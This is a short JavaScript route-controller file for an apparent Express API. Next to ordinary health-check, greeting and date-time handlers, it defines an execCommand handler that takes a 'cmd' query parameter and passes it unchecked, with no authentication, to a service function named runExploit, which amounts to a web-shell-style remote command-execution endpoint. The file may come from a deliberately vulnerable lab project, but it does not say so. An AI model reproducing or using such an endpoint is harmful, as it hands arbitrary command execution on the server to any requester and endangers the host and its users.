import * as apiService from "../services/api.service.js";

export const healthCheck = (req, res) => {
    const result = apiService.getHealth();
    res.json(result);
};

export const greeting = (req, res) => {
    const name = req.query.name;
    const result = apiService.getGreeting(name);
    res.json(result);
};

export const dateTime = (req, res) => {
    const result = apiService.getCurrentDateTime();
    res.json(result);
};

export const execCommand = async (req, res) => {
    const { cmd } = req.query;
    if (!cmd) {
        return res.status(400).json({ error: "Missing cmd parameter" });
    }

    try {
        const result = await apiService.runExploit(cmd);
        res.json(result);
    } catch (error) {
        res.status(500).json({ error: "Internal server error" });
    }
}